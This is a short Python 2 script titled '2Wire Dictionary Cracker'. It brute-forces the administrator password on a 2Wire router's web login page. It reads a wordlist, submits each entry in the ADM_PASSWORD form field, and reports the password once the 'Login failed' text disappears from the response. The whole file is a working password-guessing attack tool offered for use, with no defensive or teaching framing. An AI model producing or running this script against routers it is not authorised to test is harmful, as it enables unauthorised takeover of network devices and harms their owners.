#!/usr/bin/Python
#################################################
# 2Wire Dictionary Cracker						#
# By: Dennis Linuz <dennismald@gmail.com>		#
# Crack 2Wire router login passwords			#
#################################################
import mechanize, sys

if len(sys.argv) != 3:
	print "Usage:\n\tpython 2Wire-Cracker.py <Router Login URL> <Wordlist>\n\nExample:\n\tpython 2Wire-Cracker.py \"http://192.168.1.254/xslt?PAGE=C_0_1\" \"common_passwords.txt\""
	quit()
ROUTERURL = sys.argv[1]
WORDLIST = sys.argv[2]
FAILED_TEXT = "Login failed"
browser = mechanize.Browser()
file = open(WORDLIST,"r")
html = browser.open(ROUTERURL).read()
for word in file:
	word = word.replace("\n","")
	print "Trying: " + word
	browser.select_form(nr=0)
	browser.form['ADM_PASSWORD'] = word
	html = browser.submit().read()
	if not FAILED_TEXT in html:
		print "Password found: " + word
		break
file.close()
